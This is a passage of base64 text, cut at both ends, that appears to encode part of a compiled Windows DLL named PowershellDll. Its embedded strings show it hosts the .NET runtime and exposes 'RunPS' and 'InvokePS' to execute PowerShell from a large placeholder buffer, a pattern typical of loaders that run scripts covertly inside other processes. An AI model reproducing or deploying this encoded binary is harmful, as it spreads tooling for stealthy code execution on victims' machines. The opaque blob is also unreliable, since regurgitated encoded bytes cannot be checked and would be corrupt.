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EkAbgB0AGUAcgBmAGEAYwBlACAAZgBhAGkAbABlAGQAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAABDb3JCaW5kVG9SdW50aW1lAAAAAAAAAABDAG8AdQBsAGQAIABuAG8AdAAgAGYAaQBuAGQAIABBAFAASQAgAEMAbwByAEIAaQBuAGQAVABvAFIAdQBuAHQAaQBtAGUAAAB3AGsAcwAAAEMAbwByAEIAaQBuAGQAVABvAFIAdQBuAHQAaQBtAGUAIABmAGEAaQBsAGUAZAAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAAAAbQBzAGMAbwByAGUAZQAuAGQAbABsAAAAUHJvZ3JhbQBGAGEAaQBsAGUAZAAgAHQAbwAgAGMAcgBlAGEAdABlACAAdABoAGUAIAByAHUAbgB0AGkAbQBlACAAaABvAHMAdAAKAAAAAAAAAAAAAAAAAEMATABSACAAZgBhAGkAbABlAGQAIAB0AG8AIABzAHQAYQByAHQAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAAAAAAAAAAAAAAAAUgB1AG4AdABpAG0AZQBDAGwAcgBIAG8AcwB0ADoAOgBHAGUAdABDAHUAcgByAGUAbgB0AEEAcABwAEQAbwBtAGEAaQBuAEkAZAAgAGYAYQBpAGwAZQBkACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAAAAAAAAAAABJAEMAbwByAFIAdQBuAHQAaQBtAGUASABvAHMAdAA6ADoARwBlAHQARABlAGYAYQB1AGwAdABEAG8AbQBhAGkAbgAgAGYAYQBpAGwAZQBkACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAARgBhAGkAbABlAGQAIAB0AG8AIABnAGUAdAAgAGQAZQBmAGEAdQBsAHQAIABBAHAAcABEAG8AbQBhAGkAbgAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAAAARgBhAGkAbABlAGQAIAB0AG8AIABsAG8AYQBkACAAdABoAGUAIABhAHMAcwBlAG0AYgBsAHkAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAAAAAAAAAAAAAAAARgBhAGkAbABlAGQAIAB0AG8AIABnAGUAdAAgA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mV3aAA2AF9pbml0dGVybQA3AF9pbml0dGVybV9lAD8AX3NlaF9maWx0ZXJfZGxsABgAX2NvbmZpZ3VyZV9uYXJyb3dfYXJndgAAMwBfaW5pdGlhbGl6ZV9uYXJyb3dfZW52aXJvbm1lbnQAADQAX2luaXRpYWxpemVfb25leGl0X3RhYmxlAAA8AF9yZWdpc3Rlcl9vbmV4aXRfZnVuY3Rpb24AIgBfZXhlY3V0ZV9vbmV4aXRfdGFibGUAHgBfY3J0X2F0ZXhpdAAWAF9jZXhpdAAAYXBpLW1zLXdpbi1jcnQtc3RkaW8tbDEtMS0wLmRsbABhcGktbXMtd2luLWNydC1oZWFwLWwxLTEtMC5kbGwAAGFwaS1tcy13aW4tY3J0LXJ1bnRpbWUtbDEtMS0wLmRsbABWAkdldExhc3RFcnJvcgAA1ANNdWx0aUJ5dGVUb1dpZGVDaGFyALUDTG9jYWxGcmVlAK4EUnRsQ2FwdHVyZUNvbnRleHQAtQRSdGxMb29rdXBGdW5jdGlvbkVudHJ5AAC8BFJ0bFZpcnR1YWxVbndpbmQAAJIFVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAABSBVNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAPAkdldEN1cnJlbnRQcm9jZXNzAHAFVGVybWluYXRlUHJvY2VzcwAAcANJc1Byb2Nlc3NvckZlYXR1cmVQcmVzZW50ADAEUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIAEAJHZXRDdXJyZW50UHJvY2Vzc0lkABQCR2V0Q3VycmVudFRocmVhZElkAADdAkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAFQDSW5pdGlhbGl6ZVNMaXN0SGVhZABqA0lzRGVidWdnZXJQcmVzZW50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHQCAAQAAAAoAAAAAAAAABAACgAAAAAAAAAAAAAAAAP////8AAAAAAAAAAAAAAAAyot8tmSsAAM1dINJm1P//dZgAAAAAAAABAAAAAgAAAC8gAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQ